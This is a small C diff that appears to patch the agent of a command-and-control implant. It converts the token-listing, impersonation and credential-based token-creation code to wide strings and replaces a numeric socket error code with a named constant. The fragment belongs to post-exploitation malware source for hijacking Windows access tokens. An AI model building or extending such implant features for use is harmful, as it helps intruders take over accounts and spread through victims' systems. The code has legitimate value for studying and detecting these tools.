@@ -1320,7 +1320,7 @@ VOID CommandToken( PPARSER Parser )
 
                     PackageAddInt32( Package, TokenIndex );
                     PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList->Handle );
-                    PackageAddString( Package, TokenList->DomainUser );
+                    PackageAddWString( Package, TokenList->DomainUser );
                     PackageAddInt32( Package, TokenList->dwProcessID );
                     PackageAddInt32( Package, TokenList->Type );
                     PackageAddInt32( Package, Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenList->Handle );
@@ -1400,10 +1400,10 @@ VOID CommandToken( PPARSER Parser )
             PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
             CHAR   Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
-            PCHAR  UserDomain     = NULL;
-            LPSTR  BufferUser     = NULL;
-            LPSTR  BufferPassword = NULL;
-            LPSTR  BufferDomain   = NULL;
+            PWCHAR UserDomain     = NULL;
+            LPWSTR BufferUser     = NULL;
+            LPWSTR BufferPassword = NULL;
+            LPWSTR BufferDomain   = NULL;
             DWORD  UserDomainSize = dwUserSize + dwDomainSize + 1;
             DWORD  NewTokenID     = 0;
 
@@ -2854,7 +2854,7 @@ VOID CommandSocket( PPARSER Parser )
             {
                 PRINTF( "Could not resolve domain: %s\n", Domain );
                 // error code for "Host unreachable"
-                ErrorCode = 10065;
+                ErrorCode = WSAEHOSTUNREACH;
                 PackageAddInt32( Package, FALSE );
             }
 
